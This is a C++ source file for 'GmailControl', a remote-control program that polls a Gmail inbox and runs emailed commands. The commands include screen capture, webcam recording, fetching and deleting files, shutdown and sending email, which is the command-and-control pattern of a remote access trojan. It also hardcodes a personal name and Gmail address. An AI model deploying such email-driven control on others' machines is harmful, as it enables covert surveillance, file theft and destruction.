// Directed by
//  ___      ___  ________   _____ ______    ________   ________      
// |\  \    /  /||\   __  \ |\   _ \  _   \ |\   __  \ |\   ___  \     GmailControl version: 0.0
// \ \  \  /  / /\ \  \|\  \\ \  \\\__\ \  \\ \  \|\  \\ \  \\ \  \    
//  \ \  \/  / /  \ \   __  \\ \  \\|__| \  \\ \   __  \\ \  \\ \  \   9/1/2025
//   \ \    / /    \ \  \ \  \\ \  \    \ \  \\ \  \ \  \\ \  \\ \  \ 
//    \ \__/ /      \ \__\ \__\\ \__\    \ \__\\ \__\ \__\\ \__\\ \__\ https://github.com/Ducmanh2712
//     \|__|/        \|__|\|__| \|__|     \|__| \|__|\|__| \|__| \|__|



#include <string>
#include <thread>
#include <memory>
#include <windows.h>
#include <fstream>
#include <iphlpapi.h>
#include <vector>
#include <csignal>
#include <QApplication>
#include "../include/json.hpp"
#include "../include/base64.hpp"
#include "../gmailSender/gmailSender.hpp"
#include "../base64_encode/base64_encode.hpp"
#include "../callBack/callBack.hpp"
#include "../commandHelper/commandHelper.hpp"
#include "../commandHelper/webcam.hpp"
#include "../Source/__inIt__.hpp"
#include "../GUI/MainWindow.hpp"
#include "Server.hpp"


string getEmail(string& oldMessageId, string& accessToken) {
    string listUrl = "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=in:inbox";
    string listResponse = makeGetRequest(listUrl, accessToken);

    nlohmann::json jsonResponse;
    try {
        jsonResponse = nlohmann::json::parse(listResponse);
    } catch (const nlohmann::json::exception& e) {
        cerr << "JSON parse error: " << e.what() << endl;
        return "";
    }

    //Kiểm tra lỗi 401 trong phản hồi từ Gmail API
    Config config = loadConfig("../config.json");
    if (jsonResponse.contains("error") && jsonResponse["error"].contains("code") && jsonResponse["error"]["code"] == 401) {
        accessToken = refreshAccessToken(config.refreshToken, config.clientId, config.clientSecret, "../config.json");
        return "REFRESH_TOKEN_CALLED";
    }

    string messageId;
    if (jsonResponse.contains("messages") && !jsonResponse["messages"].empty()) {
        messageId = jsonResponse["messages"][0]["id"];
        if (messageId == oldMessageId) {
            return "NO_MESSAGE_FOUND";
        }
        oldMessageId = messageId;
    } else {
        return "JSONRESPONSEMISS";
    }


    string messageUrl = "https://gmail.googleapis.com/gmail/v1/users/me/messages/" + messageId;
    
    string messageResponse = makeGetRequest(messageUrl, accessToken);

    return messageResponse;
}


void processCommand(const string& command, const string& emailContent, const string& accessToken, const string& sender) {

    // Kiem tra xem day co phai la email do chinh he thong gui khong
    if (sender == "AUTO_REPLY") {
        return;  // Bỏ qua và thoát khỏi xử lý lệnh.
    }

    // Neu khong co tin nhan moi
    if (command == "NONE") {
        waiting();
        return;
    } 

    // Neu access token het han va can lam moi (*Ham nay chi duoc goi khi access token het han chu khong phai khi khoi tao code)
    if (command == "REFRESH TOKEN CALLED") {
        refreshToken(); 
        return;
    } 

    // Neu lenh duoc nhan dien
    cout << "Response Received" << endl;
    // Lenh shutdown 
    if (command == "SHUTDOWN") {
        shutdownCommand(command, accessToken, sender);
    }
    // Lenh restart
    else if (command == "RESTART") {
        restartCommand(command, accessToken, sender);
    }
    // Lenh ipconfig
    else if (command == "ipconfig") {
        ipconfigCommand(command, accessToken, sender);
    } 
    // Lenh chup man hinh
    else if (command == "screencap"){
        screenCaptureCommand(command, accessToken, sender);
    }
    // Lenh lay file
    else if (command.find("getfile") != string::npos){
        if (command.find("-p") == string::npos){
            getFileCommand(accessToken, sender);
        }
        else if (command.find("getfile -p") != string::npos){
            getFileCommand(command, accessToken, sender);
        }
        else {
            getFileCommand(accessToken, sender);   
        }
    }
    // Lenh xoa file
    else if (command.find("deletefile") != string::npos){
        if (command.find("-p") == string::npos){
            deleteFileCommand(accessToken, sender);
        }
        else if (command.find("deletefile -p") != string::npos){
            deleteFileCommand(command, accessToken, sender);
        }
        else {
            deleteFileCommand(accessToken, sender);
        };
    }
    //Lenh mo webcam trong mot khoang thoi gian
    else if (command.find("webcam") != string::npos){
        if (command.find("-t") == string::npos){
            webcamRecorder(accessToken, sender);
        }
        else if (command.find("webcam -t") != string::npos){
            webcamRecorder(command, accessToken, sender);
        }
        else {
            webcamRecorder(accessToken, sender);
        };
    }

    // Lenh help
    else if (command == "help"){
        helpCommand(command, accessToken, sender);
    }
    // Lenh gui mot email toi dau do
    else if (command == "SEND_EMAIL") {
        sendEmailCommand(command, accessToken, sender);
    }
    // Neu khong nhan dien duoc lenh
    else {
        unknownCommand(command, accessToken, sender);
    }
}

int gui(int argc, char *argv[], const string& sender) {
    QApplication app(argc, argv);
    MainWindow window;
    window.setSender(sender);
    window.show();
    return app.exec();
}

int main(int argc, char *argv[]) {
    string oldMessageId = __init_();

    Config config = loadConfig("config.json");
    string senderForGUI = "duc manh nguyen <nguyenducmanh27122005@gmail.com>";
    gui(argc, argv, senderForGUI);
    while (true) {
        string emailContent = getEmail(oldMessageId, config.accessToken);
        if (emailContent == "NO_MESSAGE_FOUND" || emailContent == "JSONRESPONSEMISS") {
            emailContent = R"({"snippet": "NONE"})";
        }
        if (emailContent == "REFRESH_TOKEN_CALLED") {
            emailContent = R"({"snippet": "REFRESH TOKEN CALLED"})";
        }
        
        nlohmann::json jsonResponse = nlohmann::json::parse(emailContent);
        string command = jsonResponse.value("snippet", "UNKNOWN");


        string sender = senderEmail(emailContent);
        processCommand(command, emailContent, config.accessToken, sender);
        this_thread::sleep_for(chrono::seconds(2));
    }

    return 0;
}